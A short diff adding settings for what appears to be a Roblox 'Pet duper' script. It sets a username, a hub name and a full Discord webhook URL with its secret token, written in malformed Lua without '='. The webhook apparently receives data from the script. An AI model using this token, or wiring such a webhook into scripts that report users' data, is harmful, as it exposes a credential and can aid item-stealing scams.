@@ -1,0 +1,5 @@
+_G.Username "maximum1025"
+
+_G.HubName "Pet duper"
+
+_G.WebhookUrl "https://discord.com/api/webhooks/1115244998397526096/BDQ2KyBMxn18bsOf5VTIyG07y2AyaWtVFFjPOdPhhnVWfue5hEP6ieQJ7fQFk5n_B4bE"
